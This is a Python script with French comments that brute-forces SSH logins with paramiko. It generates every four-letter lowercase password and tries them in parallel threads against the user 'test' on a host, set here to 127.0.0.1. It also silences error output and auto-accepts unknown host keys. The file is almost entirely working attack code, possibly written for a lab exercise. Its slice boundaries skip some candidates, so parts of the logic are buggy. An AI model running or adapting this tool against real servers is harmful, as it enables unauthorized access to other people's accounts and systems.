import paramiko, sys, time, threading, string, itertools as it
import sys
from datetime import datetime

#Fonction pour ne pas afficher les erreurs
class DevNull:
    def write(self, msg):
        pass

sys.stderr = DevNull()


#Fonction pour se connecter au service SSH
def create_client():
    client= paramiko.SSHClient()
    #insérer ici la gestion des empreintes
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return client


#Classe du brute forçage
class BF:
    #Initialisation de l'objet
    #On demande le jeu de caractères à utiliser, la taille max du mot de passe
    # et l'IP du service
    def __init__(self, charset, lenght, ip, startDate):
        self.charset=charset
        self.lenght=lenght
        self.ip=ip
        self.startDate = startDate

    def crack(self, UserName, Password):
        client = create_client()
        try:
            client.connect(self.ip, username=UserName, password=Password)
            print ('[!] %s:%s is CORRECT!' % (UserName, Password) + "\n[!] Temps écoulé : "+ str((datetime.now() - self.startDate)))
            exit(1)
            return Password
        except Exception as e:
            print('[-] %s:%s ' % (UserName, Password) +str(e))
            pass
        finally:
            client.close()
        return

    def test(self):
        for i in it.product(self.charset, repeat=self.lenght):
                yield "".join(i)

def main():
    ip="127.0.0.1"
    print ('[+] Bruteforcing la cible : %s' % (ip))

    charset = string.ascii_letters+string.digits
    charset2 = "abcdefghijklmnopqrstuvwxyz"
    startDate = datetime.now()
    bruteforce = BF(charset2, 4, ip, startDate)
    test = list(bruteforce.test())
    #print(test[263639])
    passwords = []
    for item in test:
        passwords.append(item)
    #print(len(passwords))
    list_pass1 = passwords[:123031]
    #print(list_pass1)
    list_pass2 = passwords[len(list_pass1)+1:263640]
    #print(list_pass2)
    list_pass3 = passwords[len(list_pass1)+len(list_pass2)+1: 456976]
    #print(list_pass3[0])

    
    
    for pass1, pass2, pass3 in zip(list_pass1, list_pass2, list_pass3):
        pass1 = pass1.strip()
        pass2 = pass2.strip()
        pass3 = pass3.strip()

        t = threading.Thread(target=bruteforce.crack, args=("test",pass1))
        t.start()
        t2 = threading.Thread(target=bruteforce.crack, args=("test",pass2))
        t2.start()
        t3 = threading.Thread(target=bruteforce.crack, args=("test",pass3))
        t3.start()

        time.sleep(1)




    




if __name__ == '__main__':
    main()